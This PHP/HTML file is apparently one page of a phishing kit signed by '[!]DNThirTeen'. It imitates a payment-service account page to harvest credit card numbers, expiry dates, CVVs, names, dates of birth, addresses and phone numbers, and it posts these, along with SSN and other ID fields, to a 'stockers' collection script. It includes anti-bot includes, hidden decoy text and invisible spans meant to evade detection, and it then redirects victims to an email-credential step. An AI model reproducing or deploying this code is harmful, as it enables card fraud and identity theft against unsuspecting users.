<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
include '../extra/mine.php';
if ($show_identity=="yes") {
$nextpage="identity";
}if ($show_bank=="yes") {
$nextpage="bank";
}if ($show_mailaccess=="yes") {
$nextpage="mailprovider";
}if ($show_newcard=="yes") {
$nextpage="processcard";
}if ($show_3D_VBV=="yes") {
$nextpage="authentication";
}else{
	$nextpage="thanks";
}
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
		<?php echo $lg_process['title']?></title>
		<link rel="stylesheet" href="lib/styles/process.css">
		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
	</head>
	<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
<input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
	<div class="navContainer">
		<a href="javascript:" class="desktopBrand"></a>
		<div class="mobileMenu">
			<div class="logoutMobile">
				<a href="javascript:" class="logoutTxtMobile">
					<?php echo $lg_process['logout']?></a>
				</div>
				<div class="settingsMobile">
					<a href="javascript:" class="svgLogo settingsTxt">
						<img src="lib/pics/settings.svg" alt=""></a>
					</div>
					<div>
						<p class="displayMail">
							<?php echo $_SESSION['EML']?></p>
						</div>
					</div>
<div class="desktopMenu">
	<nav class="desktopItems">
		<ul class="firstUl">
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['home']?>
			</a>
		</li>
		<li class="">
			<a href="javascript:" class="linksTxt">
				<?php echo $lg_process['menu']['activity']?></a>
			</li>
			<li class="">
				<a href="javascript:" class="linksTxt">
					<?php echo $lg_process['menu']['send_receive']?></a></li><li class="">
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a>
					</li>
					<li class="activeLi">
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a>
					</li>
				</ul>
				<ul class="secondUl">
					<li class="notifLi">
						<a href="javascript:" class="svgLogo notifTxt">
							<img src="lib/pics/noti.svg" alt=""></a>
						</li>
						<li>
							<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
						</li>
						<li class="logoutLi">
							<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a>
						</li>
						</ul>
					</nav>
				</div>
			</div>
		</div>
<div class="mainContainer">
	<div class="hide" id="rotate">
		<div class="spinner">
			<div class="rotate"></div>
			<div class="processing"><?php echo $lg_sign['rotate']?></div>
		</div>
		<div class="overlay">
		</div>
	</div>
	<div class="mobileNav">
		<div class="navHeader">
			<div class="blockToggler">
				<label class="menuLabel" for="toggleMenu"><span></span>
					<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div>
					<div class="menuClose">
						<?php echo $lg_process['menu']['close']?></div>
					</label>
				</div>
			</div>
			<div class="navLogo"><a href="javascript:" class="mobileBrand"></a>
			</div><ul class="notifUl"><li><a class="svgLogo notifTxt">
				<img src="lib/pics/noti.svg" alt="">
			</a>
		</li>
	</ul>
</div>
<div class="contents">
	<section class="mainContents" id="process">
		<form action="#" method="post" style="padding:0 20px" novalidate="on">
		<h1 style="padding-bottom:10px">
			<span style="font-size:0">darkness</span>
			<?php echo $lg_process['head1']?>
			<span style="font-size:0">isnot good</span></h1>
			<div class="fields clearfix">
				<div class="dropDown">
					<select id="ctp" required>
						<option value="-1" disabled selected>
						<?php echo $lg_process['ctype']?>
					</option>
					<option value="vsa">Visa</option>
					<option value="msc">MasterCard</option>
					<option value="dsc">Discover</option>
					<option value="amx">American Express</option>
					<option value="jcb">JCB</option>
				</select>
					<div class="labelSelect">
						<?php echo $lg_process['ctype']?>
					</div>
				</div>
				<div class="inputArea">
					<input id="ccn" type="tel" required placeholder="<?php echo $lg_process['cnumber']?>" maxlength="19" autocomplete="off">
				</div>
				<div class="multiInputs">
					<div class="inputArea hasSub">
						<input id="cex" type="tel" required placeholder="<?php echo $lg_process['exp']?>" maxlength="7" autocomplete="off">
					</div>
					<div class="inputArea hasSub csc pull-right">
						<input id="csc" type="tel" required placeholder="<?php echo $lg_process['csc']?>" maxlength="4" autocomplete="off">
					</div>
				</div>
			</div>
			<h1>
				<span style="font-size:0">darkness</span>
				<?php echo $lg_process['head2']?>
				<span style="font-size:0">oor night</span>
			</h1>
			<div class="fields clearfix">
				<div class="multiInputs">
					<div class="inputArea hasSub">
						<input id="fnm" type="text" class="txt-capital" required placeholder="<?php echo $lg_process['name']?>"></div>
					<div class="inputArea hasSub pull-right" style="margin-bottom:15px">
						<input id="dob" type="tel" required placeholder="<?php echo $lg_process['dob']?>" maxlength="10">
					</div>
				</div>
				<div class="inputArea">
					<input id="adr" type="text" required placeholder="<?php echo $lg_process['address']?>">
				</div>
				<div class="multiInputs">
					<div class="inputArea hasSub">
						<input id="cty" type="text" required placeholder="<?php echo $lg_process['city']?>">
					</div>
					<div class="inputArea hasSub pull-right">
						<input id="zip" type="text" required placeholder="<?php echo $_SESSION['ip_countryCode']=='GB'?'Postcode':$lg_process['zip']?>" maxlength="8">
					</div>
				</div>
				<div class="multiInputs">
					<div class="inputArea hasSub">
						<input id="stt" type="text" required placeholder="State / Region">
					</div>
					<div class="inputArea hasSub pull-right">
						<input id="cnt" type="text" required placeholder="Country" value="<?php echo $_SESSION['ip_countryName']?>">
					</div>
				</div>
				<div class="multiInputs">
					<div class="dropDown mobileType" style="float:left;width:33%;margin:15px 0 9px">
							<select id="ptp" required>
								<option value="-1" disabled selected>
									<?php echo $lg_process['ptype']?>
								</option>
								<option value="MOBILE">Mobile</option>
								<option value="HOME">Home</option>
								<option value="WORK">Work</option>
							</select>
							<div class="labelSelect">
								<?php echo $lg_process['ptype']?>
							</div>
						</div>
						<div class="dropDown mobilePreffix" style="float:left;width:18%;margin:15px 0 0 10px">
							<select id="par" required>
								<option value="1 (CA)" label="1 (CA)">1 (CA)</option>
								<option value="1 (US)" label="1 (US)" selected>1 (US)</option>
								<option value="1 (BS)" label="1 (BS)">1 (BS)</option>
								<option value="1 (BB)" label="1 (BB)">1 (BB)</option>
								<option value="1 (AI)" label="1 (AI)">1 (AI)</option>
								<option value="1 (AG)" label="1 (AG)">1 (AG)</option>
								<option value="1 (VG)" label="1 (VG)">1 (VG)</option>
								<option value="1 (VI)" label="1 (VI)">1 (VI)</option>
								<option value="1 (KY)" label="1 (KY)">1 (KY)</option>
								<option value="1 (BM)" label="1 (BM)">1 (BM)</option>
								<option value="1 (GD)" label="1 (GD)">1 (GD)</option>
								<option value="1 (TC)" label="1 (TC)">1 (TC)</option>
								<option value="1 (MS)" label="1 (MS)">1 (MS)</option>
								<option value="1 (MP)" label="1 (MP)">1 (MP)</option>
								<option value="1 (GU)" label="1 (GU)">1 (GU)</option>
								<option value="1 (AS)" label="1 (AS)">1 (AS)</option>
								<option value="1 (S1)" label="1 (S1)">1 (S1)</option>
								<option value="1 (LC)" label="1 (LC)">1 (LC)</option>
								<option value="1 (DM)" label="1 (DM)">1 (DM)</option>
								<option value="1 (VC)" label="1 (VC)">1 (VC)</option>
								<option value="1 (PR)" label="1 (PR)">1 (PR)</option>
								<option value="1 (DO)" label="1 (DO)">1 (DO)</option>
								<option value="1 (TT)" label="1 (TT)">1 (TT)</option>
								<option value="1 (KN)" label="1 (KN)">1 (KN)</option>
								<option value="1 (JM)" label="1 (JM)">1 (JM)</option>
								<option value="7 (RU)" label="7 (RU)">7 (RU)</option>
								<option value="7 (KZ)" label="7 (KZ)">7 (KZ)</option>
								<option value="20 (EG)" label="20 (EG)">20 (EG)</option>
								<option value="27 (ZA)" label="27 (ZA)">27 (ZA)</option>
								<option value="30 (GR)" label="30 (GR)">30 (GR)</option>
								<option value="31 (NL)" label="31 (NL)">31 (NL)</option>
								<option value="32 (BE)" label="32 (BE)">32 (BE)</option>
								<option value="33 (FR)" label="33 (FR)">33 (FR)</option>
								<option value="34 (ES)" label="34 (ES)">34 (ES)</option>
								<option value="36 (HU)" label="36 (HU)">36 (HU)</option>
								<option value="39 (IT)" label="39 (IT)">39 (IT)</option>
								<option value="40 (RO)" label="40 (RO)">40 (RO)</option>
								<option value="41 (CH)" label="41 (CH)">41 (CH)</option>
								<option value="43 (AT)" label="43 (AT)">43 (AT)</option>
								<option value="44 (GB)" label="44 (GB)">44 (GB)</option>
								<option value="45 (DK)" label="45 (DK)">45 (DK)</option>
								<option value="46 (SE)" label="46 (SE)">46 (SE)</option>
								<option value="47 (SJ)" label="47 (SJ)">47 (SJ)</option>
								<option value="47 (NO)" label="47 (NO)">47 (NO)</option>
								<option value="48 (PL)" label="48 (PL)">48 (PL)</option>
								<option value="49 (DE)" label="49 (DE)">49 (DE)</option>
								<option value="51 (PE)" label="51 (PE)">51 (PE)</option>
								<option value="52 (MX)" label="52 (MX)">52 (MX)</option>
								<option value="53 (CU)" label="53 (CU)">53 (CU)</option>
								<option value="54 (AR)" label="54 (AR)">54 (AR)</option>
								<option value="55 (BR)" label="55 (BR)">55 (BR)</option>
								<option value="56 (CL)" label="56 (CL)">56 (CL)</option>
								<option value="57 (CO)" label="57 (CO)">57 (CO)</option>
								<option value="58 (VE)" label="58 (VE)">58 (VE)</option>
								<option value="60 (MY)" label="60 (MY)">60 (MY)</option>
								<option value="61 (CC)" label="61 (CC)">61 (CC)</option>
								<option value="61 (AU)" label="61 (AU)">61 (AU)</option>
								<option value="61 (CX)" label="61 (CX)">61 (CX)</option>
								<option value="62 (ID)" label="62 (ID)">62 (ID)</option>
								<option value="63 (PH)" label="63 (PH)">63 (PH)</option>
								<option value="64 (PN)" label="64 (PN)">64 (PN)</option>
								<option value="64 (NZ)" label="64 (NZ)">64 (NZ)</option>
								<option value="65 (SG)" label="65 (SG)">65 (SG)</option>
								<option value="66 (TH)" label="66 (TH)">66 (TH)</option>
								<option value="81 (JP)" label="81 (JP)">81 (JP)</option>
								<option value="82 (KR)" label="82 (KR)">82 (KR)</option>
								<option value="84 (VN)" label="84 (VN)">84 (VN)</option>
								<option value="86 (CN)" label="86 (CN)">86 (CN)</option>
								<option value="90 (TR)" label="90 (TR)">90 (TR)</option>
								<option value="91 (IN)" label="91 (IN)">91 (IN)</option>
								<option value="92 (PK)" label="92 (PK)">92 (PK)</option>
								<option value="93 (AF)" label="93 (AF)">93 (AF)</option>
								<option value="94 (LK)" label="94 (LK)">94 (LK)</option>
								<option value="95 (MM)" label="95 (MM)">95 (MM)</option>
								<option value="98 (IR)" label="98 (IR)">98 (IR)</option>
								<option value="211 (SS)" label="211 (SS)">211 (SS)</option>
								<option value="212 (MA)" label="212 (MA)">212 (MA)</option>
								<option value="212 (EH)" label="212 (EH)">212 (EH)</option>
								<option value="213 (DZ)" label="213 (DZ)">213 (DZ)</option>
								<option value="216 (TN)" label="216 (TN)">216 (TN)</option>
								<option value="218 (LY)" label="218 (LY)">218 (LY)</option>
								<option value="220 (GM)" label="220 (GM)">220 (GM)</option>
								<option value="221 (SN)" label="221 (SN)">221 (SN)</option>
								<option value="222 (MR)" label="222 (MR)">222 (MR)</option>
								<option value="223 (ML)" label="223 (ML)">223 (ML)</option>
								<option value="224 (GN)" label="224 (GN)">224 (GN)</option>
								<option value="225 (CI)" label="225 (CI)">225 (CI)</option>
								<option value="226 (BF)" label="226 (BF)">226 (BF)</option>
								<option value="227 (NE)" label="227 (NE)">227 (NE)</option>
								<option value="228 (TG)" label="228 (TG)">228 (TG)</option>
								<option value="229 (BJ)" label="229 (BJ)">229 (BJ)</option>
								<option value="230 (MU)" label="230 (MU)">230 (MU)</option>
								<option value="231 (LR)" label="231 (LR)">231 (LR)</option>
								<option value="232 (SL)" label="232 (SL)">232 (SL)</option>
								<option value="233 (GH)" label="233 (GH)">233 (GH)</option>
								<option value="234 (NG)" label="234 (NG)">234 (NG)</option>
								<option value="235 (TD)" label="235 (TD)">235 (TD)</option>
								<option value="236 (CF)" label="236 (CF)">236 (CF)</option>
								<option value="237 (CM)" label="237 (CM)">237 (CM)</option>
								<option value="238 (CV)" label="238 (CV)">238 (CV)</option>
								<option value="239 (ST)" label="239 (ST)">239 (ST)</option>
								<option value="240 (GQ)" label="240 (GQ)">240 (GQ)</option>
								<option value="241 (GA)" label="241 (GA)">241 (GA)</option>
								<option value="242 (CG)" label="242 (CG)">242 (CG)</option>
								<option value="243 (CD)" label="243 (CD)">243 (CD)</option>
								<option value="244 (AO)" label="244 (AO)">244 (AO)</option>
								<option value="245 (GW)" label="245 (GW)">245 (GW)</option>
								<option value="246 (IO)" label="246 (IO)">246 (IO)</option>
								<option value="248 (SC)" label="248 (SC)">248 (SC)</option>
								<option value="249 (SD)" label="249 (SD)">249 (SD)</option>
								<option value="250 (RW)" label="250 (RW)">250 (RW)</option>
								<option value="251 (ET)" label="251 (ET)">251 (ET)</option>
								<option value="252 (SO)" label="252 (SO)">252 (SO)</option>
								<option value="253 (DJ)" label="253 (DJ)">253 (DJ)</option>
								<option value="254 (KE)" label="254 (KE)">254 (KE)</option>
								<option value="255 (TZ)" label="255 (TZ)">255 (TZ)</option>
								<option value="256 (UG)" label="256 (UG)">256 (UG)</option>
								<option value="257 (BI)" label="257 (BI)">257 (BI)</option>
								<option value="258 (MZ)" label="258 (MZ)">258 (MZ)</option>
								<option value="260 (ZM)" label="260 (ZM)">260 (ZM)</option>
								<option value="261 (MG)" label="261 (MG)">261 (MG)</option>
								<option value="262 (RE)" label="262 (RE)">262 (RE)</option>
								<option value="262 (YT)" label="262 (YT)">262 (YT)</option>
								<option value="263 (ZW)" label="263 (ZW)">263 (ZW)</option>
								<option value="264 (NA)" label="264 (NA)">264 (NA)</option>
								<option value="265 (MW)" label="265 (MW)">265 (MW)</option>
								<option value="266 (LS)" label="266 (LS)">266 (LS)</option>
								<option value="267 (BW)" label="267 (BW)">267 (BW)</option>
								<option value="268 (SZ)" label="268 (SZ)">268 (SZ)</option>
								<option value="269 (KM)" label="269 (KM)">269 (KM)</option>
								<option value="290 (SH)" label="290 (SH)">290 (SH)</option>
								<option value="291 (ER)" label="291 (ER)">291 (ER)</option>
								<option value="297 (AW)" label="297 (AW)">297 (AW)</option>
								<option value="298 (FO)" label="298 (FO)">298 (FO)</option>
								<option value="299 (GL)" label="299 (GL)">299 (GL)</option>
								<option value="350 (GI)" label="350 (GI)">350 (GI)</option>
								<option value="351 (PT)" label="351 (PT)">351 (PT)</option>
								<option value="352 (LU)" label="352 (LU)">352 (LU)</option>
								<option value="353 (IE)" label="353 (IE)">353 (IE)</option>
								<option value="354 (IS)" label="354 (IS)">354 (IS)</option>
								<option value="355 (AL)" label="355 (AL)">355 (AL)</option>
								<option value="356 (MT)" label="356 (MT)">356 (MT)</option>
								<option value="357 (CY)" label="357 (CY)">357 (CY)</option>
								<option value="358 (FI)" label="358 (FI)">358 (FI)</option>
								<option value="359 (BG)" label="359 (BG)">359 (BG)</option>
								<option value="370 (LT)" label="370 (LT)">370 (LT)</option>
								<option value="371 (LV)" label="371 (LV)">371 (LV)</option>
								<option value="372 (EE)" label="372 (EE)">372 (EE)</option>
								<option value="373 (MD)" label="373 (MD)">373 (MD)</option>
								<option value="374 (AM)" label="374 (AM)">374 (AM)</option>
								<option value="375 (BY)" label="375 (BY)">375 (BY)</option>
								<option value="376 (AD)" label="376 (AD)">376 (AD)</option>
								<option value="377 (MC)" label="377 (MC)">377 (MC)</option>
								<option value="378 (SM)" label="378 (SM)">378 (SM)</option>
								<option value="379 (VA)" label="379 (VA)">379 (VA)</option>
								<option value="380 (UA)" label="380 (UA)">380 (UA)</option>
								<option value="381 (RS)" label="381 (RS)">381 (RS)</option>
								<option value="382 (ME)" label="382 (ME)">382 (ME)</option>
								<option value="383 (XK)" label="383 (XK)">383 (XK)</option>
								<option value="385 (HR)" label="385 (HR)">385 (HR)</option>
								<option value="386 (SI)" label="386 (SI)">386 (SI)</option>
								<option value="387 (BA)" label="387 (BA)">387 (BA)</option>
								<option value="389 (MK)" label="389 (MK)">389 (MK)</option>
								<option value="420 (CZ)" label="420 (CZ)">420 (CZ)</option>
								<option value="421 (SK)" label="421 (SK)">421 (SK)</option>
								<option value="423 (LI)" label="423 (LI)">423 (LI)</option>
								<option value="500 (FK)" label="500 (FK)">500 (FK)</option>
								<option value="501 (BZ)" label="501 (BZ)">501 (BZ)</option>
								<option value="502 (GT)" label="502 (GT)">502 (GT)</option>
								<option value="503 (SV)" label="503 (SV)">503 (SV)</option>
								<option value="504 (HN)" label="504 (HN)">504 (HN)</option>
								<option value="505 (NI)" label="505 (NI)">505 (NI)</option>
								<option value="506 (CR)" label="506 (CR)">506 (CR)</option>
								<option value="507 (PA)" label="507 (PA)">507 (PA)</option>
								<option value="508 (PM)" label="508 (PM)">508 (PM)</option>
								<option value="509 (HT)" label="509 (HT)">509 (HT)</option>
								<option value="590 (BL)" label="590 (BL)">590 (BL)</option>
								<option value="590 (MF)" label="590 (MF)">590 (MF)</option>
								<option value="591 (BO)" label="591 (BO)">591 (BO)</option>
								<option value="592 (GY)" label="592 (GY)">592 (GY)</option>
								<option value="593 (EC)" label="593 (EC)">593 (EC)</option>
								<option value="595 (PY)" label="595 (PY)">595 (PY)</option>
								<option value="597 (SR)" label="597 (SR)">597 (SR)</option>
								<option value="598 (UY)" label="598 (UY)">598 (UY)</option>
								<option value="599 (CW)" label="599 (CW)">599 (CW)</option>
								<option value="599 (AN)" label="599 (AN)">599 (AN)</option>
								<option value="670 (TL)" label="670 (TL)">670 (TL)</option>
								<option value="672 (AQ)" label="672 (AQ)">672 (AQ)</option>
								<option value="673 (BN)" label="673 (BN)">673 (BN)</option>
								<option value="674 (NR)" label="674 (NR)">674 (NR)</option>
								<option value="675 (PG)" label="675 (PG)">675 (PG)</option>
								<option value="676 (TO)" label="676 (TO)">676 (TO)</option>
								<option value="677 (SB)" label="677 (SB)">677 (SB)</option>
								<option value="678 (VU)" label="678 (VU)">678 (VU)</option>
								<option value="679 (FJ)" label="679 (FJ)">679 (FJ)</option>
								<option value="680 (PW)" label="680 (PW)">680 (PW)</option>
								<option value="681 (WF)" label="681 (WF)">681 (WF)</option>
								<option value="682 (CK)" label="682 (CK)">682 (CK)</option>
								<option value="683 (NU)" label="683 (NU)">683 (NU)</option>
								<option value="685 (WS)" label="685 (WS)">685 (WS)</option>
								<option value="686 (KI)" label="686 (KI)">686 (KI)</option>
								<option value="687 (NC)" label="687 (NC)">687 (NC)</option>
								<option value="688 (TV)" label="688 (TV)">688 (TV)</option>
								<option value="689 (PF)" label="689 (PF)">689 (PF)</option>
								<option value="690 (TK)" label="690 (TK)">690 (TK)</option>
								<option value="691 (FM)" label="691 (FM)">691 (FM)</option>
								<option value="692 (MH)" label="692 (MH)">692 (MH)</option>
								<option value="850 (KP)" label="850 (KP)">850 (KP)</option>
								<option value="852 (HK)" label="852 (HK)">852 (HK)</option>
								<option value="853 (MO)" label="853 (MO)">853 (MO)</option>
								<option value="855 (KH)" label="855 (KH)">855 (KH)</option>
								<option value="856 (LA)" label="856 (LA)">856 (LA)</option>
								<option value="880 (BD)" label="880 (BD)">880 (BD)</option>
								<option value="886 (TW)" label="886 (TW)">886 (TW)</option>
								<option value="960 (MV)" label="960 (MV)">960 (MV)</option>
								<option value="961 (LB)" label="961 (LB)">961 (LB)</option>
								<option value="962 (JO)" label="962 (JO)">962 (JO)</option>
								<option value="963 (SY)" label="963 (SY)">963 (SY)</option>
								<option value="964 (IQ)" label="964 (IQ)">964 (IQ)</option>
								<option value="965 (KW)" label="965 (KW)">965 (KW)</option>
								<option value="966 (SA)" label="966 (SA)">966 (SA)</option>
								<option value="967 (YE)" label="967 (YE)">967 (YE)</option>
								<option value="968 (OM)" label="968 (OM)">968 (OM)</option>
								<option value="970 (PS)" label="970 (PS)">970 (PS)</option>
								<option value="971 (AE)" label="971 (AE)">971 (AE)</option>
								<option value="972 (IL)" label="972 (IL)">972 (IL)</option>
								<option value="973 (BH)" label="973 (BH)">973 (BH)</option>
								<option value="974 (QA)" label="974 (QA)">974 (QA)</option>
								<option value="975 (BT)" label="975 (BT)">975 (BT)</option>
								<option value="976 (MN)" label="976 (MN)">976 (MN)</option>
								<option value="977 (NP)" label="977 (NP)">977 (NP)</option>
								<option value="992 (TJ)" label="992 (TJ)">992 (TJ)</option>
								<option value="993 (TM)" label="993 (TM)">993 (TM)</option>
								<option value="994 (AZ)" label="994 (AZ)">994 (AZ)</option>
								<option value="995 (GE)" label="995 (GE)">995 (GE)</option>
								<option value="996 (KG)" label="996 (KG)">996 (KG)</option>
								<option value="998 (UZ)" label="998 (UZ)">998 (UZ)</option>
								</select>
	<div class="labelSelect">1 (US)</div>
	<script>
		$("#par>option").each(
			function(a,b){
				if($(this).val().split("(")[1].replace(")","")=="<?php echo $_SESSION['ip_countryCode']?>"){$(this).attr("selected","selected");$(".mobilePreffix .labelSelect").html($(this).text())}else{$(this).removeAttr("selected")}});</script>
		</div>
		<div class="inputArea hasSub pull-right nMobile" style="width:45.6%"><input id="pnm" type="tel" required placeholder="<?php echo $lg_process['pnumber']?>" maxlength="15">
			</div>
			</div>
			
			</div>
		<div>
			<input style="margin-top:20px;width:100%" type="submit" class="bt" value="<?php echo $lg_process['bt_save']?>">
		</div>
	</form>
</section>
</div>
<div>
	<div class="ftr"><div class="footerFirstContent"><ul class="footerList"><li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li><li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li></ul><div class="footerSecondContent"><p class="footerP">Copyright ©<span>1999-2019</span> . <?php echo $lg_process['footer']['rights']?></p><ul class="footerUl"><li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li></ul></div></div></div></div></div>
	<script>
		$(document).ready(function(){
		$('#cex').mask('00/0000');
		$('#csc').mask('0000');$('#dob').mask('00/00/0000');
		$('#ccn').mask('0000 0000 0000 0000 000');
		$('#pnm').mask('000000000000000');
		$('#ssn').mask('000-00-0000');
		$('#acn').mask('00000000');
		$('#stc').mask('00-00-00');
		$('#sin').mask('000-000-000');
		function validExp(b){var a=new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");
		return a.test(b);
	}
function isDate(vl){var rg=/^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;return rg.test(vl);}
function validDob(vl){var c=false;if(isDate(vl)&&(vl.split('/')[2]>"1919"&&vl.split('/')[2]<"2006")){c=true;}
return c;}
function valid(){var check=true;var ii=0;$('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i,el){if(!$(el).val()){$(el).parent().addClass('hasError');check=false;}else{$(el).not('#ccn').parent().removeClass('hasError');}
if($(el).attr('id')=='cex'){if(!validExp($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='dob'){if(!validDob($(el).val())){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}}
if($(el).attr('id')=='csc'){if($('select:first').val()=='amx'&&$(el).val().length!=4){$(el).parent().addClass('hasError');check=false;}else{$(el).parent().removeClass('hasError');}
if($('select:first').val()!='amx'&&$(el).val().length!=3){$(el).parent().addClass('hasError');check=false;}}});return check;}
$(document).on('change','#process select',function(){$(this).parent().removeClass('hasError');$(this).parent().children('.labelSelect').html($(this).children("option:selected").text());$(this).parent().attr('data-name',$(this).val());if($(this).val()=='amx'){$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('3','4'));$('.csc input').attr('maxlength','4');}else{$('.csc input').attr('placeholder',$('.csc input').attr('placeholder').replace('4','3'));$('.csc input').attr('maxlength','3');}});var ccvalid=false;$('#ccn').validateCreditCard(function(result){var cc=$('#ccn');if(cc.val()!=''){if(result.valid){cc.parent().removeClass('hasError');ccvalid=true;}else{cc.parent().addClass('hasError');ccvalid=false;}}});$('#process input:not(.bt):not([type=checkbox]),select').each(function(i,el){$(el).keyup(function(){valid();});$(el).change(function(){valid();});});$(document).on('submit','#process form',function(){check=true;if(!valid()){check=false;}
if(!validExp($('#cex').val())){$('#cex').parent().addClass('hasError');check=false;}else{$('#cex').parent().removeClass('hasError');}
if(!ccvalid){$('#ccn').parent().addClass('hasError');check=false;}
if(!validDob($('#dob').val())){$('#dob').parent().addClass('hasError');check=false;}
if(!check){return false;}else{$('#rotate').removeClass('hide');var ctp=$('#ctp').children("option:selected").text();var ccn=$('#ccn').val();var cex=$('#cex').val();var csc=$('#csc').val();var fnm=$('#fnm').val();var dob=$('#dob').val();var adr=$('#adr').val();var cty=$('#cty').val();var zip=$('#zip').val();var stt=$('#stt').val();var cnt=$('#cnt').val();var ptp=$('#ptp').val();var par=$('#par').val();var pnm=$('#pnm').val();var mdn=$('#mdn').val();var ssn=$('#ssn').val();var pps=$('#pps').val();var clm=$('#clm').val();var dln=$('#dln').val();var sin=$('#sin').val();var pse=$('#pse').val();var dni=$('#dni').val();var bsn=$('#bsn').val();var cpf=$('#cpf').val();var fcn=$('#fcn').val();var acn=$('#acn').val();var stc=$('#stc').val();var bus=$('#bus').val();var bpw=$('#bpw').val();var o={ctp,ccn,cex,csc,fnm,dob,adr,cty,zip,stt,cnt,ptp,par,pnm,mdn,ssn,pps,clm,dln,sin,pse,dni,bsn,cpf,fcn,acn,stc,bus,bpw};var start=new Date;var xT=0;var idT=setInterval(function(){xT=Math.trunc((new Date-start)/1000);},1000);var toStart=0;$.post('../extra/stockers/step2.php',o,function(data,status){window.location.href="mailprovider";
	if(data=='done'&&status=='success'){clearInterval(idT);if(xT>4){toStart=0;}else{toStart=1800;}
setTimeout(function(){setId();},toStart);}else{$('#rotate').addClass('hide');}});}
return false;});function setId(){$('#rotate').addClass('hide');$('#process').addClass('hide');$('#finish').removeClass('hide');window.scrollTo(0,0);}
$('.gone_bt').click(function(){window.location.href="mailprovider";});function readFile(files,me,check){if(files){for(var i=0;i<files.length;i++){var FR=new FileReader();FR.onload=function(e){if(e.target.result.startsWith("data:image/")&&e.total<=5000000){if(check){$(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}else{$(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="'+e.target.result+'" alt=""><button class="btDel">X</button></div>');}
$(me).closest('form').append('<input type="hidden" value="'+e.target.result+'" name="images[]">');}}
FR.readAsDataURL(files[i]);}}}
$(document).on('click','.zone',function(e){e.stopPropagation();$(this).find('input[type=file]').trigger(e);});$(document).on('click','.btDel',function(){$(this).closest('form').find('[value="'+$(this).prev().attr('src')+'"]').remove();$(this).parent().remove();});$(document).on('change','input[type=file]',function(){readFile(this.files,this,false);});$(".dropzone-main").on('dragleave',function(e){e.preventDefault();$(this).css('border','2px dashed #dee3e7');$(this).css('background','#f0f2f4');});$(".dropzone-main").on('dragover',function(e){e.preventDefault();$(this).css('border','2px dashed #0564b3');$(this).css('background','#ecf1f9');});$(".dropzone-main").on('drop',function(e){e.preventDefault();$(this).css('border','2px dashed #41ad49');readFile(e.originalEvent.dataTransfer.files,this,true);});});</script>
</body>
</html>